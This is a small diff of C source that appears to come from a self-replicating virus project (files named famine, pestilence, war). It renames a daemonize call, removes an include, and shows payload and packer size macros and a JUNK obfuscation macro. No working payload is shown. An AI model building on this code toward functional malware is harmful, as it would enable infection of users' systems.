@@ -9,7 +9,6 @@
 #include "map.h"
 #include "utils.h"
 #include "bss.h"
-#include "text.h"
 #include "pestilence.h"
 #include "war.h"
 #include "famine.h"
@@ -28,7 +27,7 @@
 #define PAYLOAD_SIZE (uintptr_t)&real_end - (uintptr_t)&real_start
 #define PACKER_SIZE (uintptr_t)&real_start - (uintptr_t)&_start
 
-extern int daemonize(void);
+extern int run_daemon(void);
 extern void	real_end(void);
 
 void	famine(bootstrap_data_t *bootstrap_data, uint16_t *counter);
@@ -330,7 +329,7 @@ void	entrypoint(int argc, char **argv, char **envp)
 
 	g_envp = bootstrap_data.envp;
 
-	daemonize(); JUNK;
+	run_daemon(); JUNK;
 
 	famine(&bootstrap_data, &counter);
 
